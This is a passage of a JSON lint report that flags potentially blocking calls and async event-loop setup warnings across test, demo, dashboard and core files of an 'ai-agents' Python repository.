        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.582351"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_input_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591369"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_input_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591423"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_authentication_bypass may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591467"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_authentication may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591506"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_authorization_enforcement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591543"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_authorization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591582"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_data_encryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591619"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_encryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591656"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_decryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591693"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_sql_injection_protection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591734"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_xss_protection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591771"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_command_injection_protection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591808"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_path_traversal_protection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591845"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_valid_input_acceptance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591882"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_authentication_bypass_attempts may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591922"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_authorization_enforcement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591959"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_session_security may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.591996"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _validate_session may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592035"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_sensitive_data_encryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592075"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_sensitive_data_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592112"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_data_masking may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592149"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_data_masking may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592186"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_agent_message_encryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592223"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_agent_message_encryption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592260"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function test_agent_identity_verification may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592297"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Async function _simulate_agent_verification may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.592333"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_analyze_task_complexity_low may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604697"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_analyze_task_complexity_high may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604754"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_analyze_task_with_missing_information may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604793"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_complexity_analysis_data_size_scaling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604830"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_learn_from_execution_success may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604869"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_learn_from_execution_failure may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604905"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_strategy_recommendation_generation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604942"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_pattern_recognition_across_tasks may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.604978"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_performance_metrics_collection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605016"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_performance_trend_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605057"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_performance_bottleneck_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605100"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_optimal_agent_selection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605149"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_multi_agent_team_selection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605198"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_load_balancing_consideration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605241"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_capability_matching may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605284"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_resource_allocation_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605327"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_cost_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605370"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_dynamic_resource_scaling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605413"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_complete_task_orchestration_cycle may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605459"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function test_adaptive_orchestration_with_feedback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605503"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_analyze_complexity may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.605990"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_complexity_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606046"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_learn_from_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606101"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_learn_from_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606154"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_recommend_strategy may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606203"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_extract_patterns may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606256"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_record_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606309"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_analyze_trends may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606362"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_detect_bottlenecks may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606416"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_select_optimal_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606468"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_select_agent_team may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606522"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_selection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606585"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_capability_match may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606639"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_optimize_allocation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606706"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_cost_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606801"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_calculate_scaling_needs may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606879"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_orchestrate_task may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.606976"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_learn_from_execution_failure may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.607052"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_learn_from_execution_success may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.607104"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_recommend_strategy may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.607166"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_analyze_complexity may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.607464"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Async function mock_analyze_complexity may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.607598"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.619805"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Potentially blocking call: Popen",
        "timestamp": "2025-09-05T17:30:46.619978"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Potentially blocking call: Popen",
        "timestamp": "2025-09-05T17:30:46.620023"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Potentially blocking call: Popen",
        "timestamp": "2025-09-05T17:30:46.620087"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.620347"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.624885"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.625059"
      },
      {
        "category": "ASYNC_ANALYSIS",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\secure_deployment.py",
        "warning": "Failed to analyze: 'utf-8' codec can't decode byte 0xca in position 8436: invalid continuation byte",
        "timestamp": "2025-09-05T17:30:46.626092"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.656616"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.780141"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.780216"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.782725"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.792245"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.797776"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.797919"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.799833"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.850647"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.850688"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.858756"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.858777"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.859186"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.859219"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.918502"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.918614"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.918707"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.024190"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.024222"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.025085"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026189"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026241"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026275"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.026354"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026428"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026444"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026945"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.026987"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.027032"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.052438"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.052478"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.052643"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.052669"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.053581"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.053604"
      },
      {
        "category": "ASYNC_PATTERN",
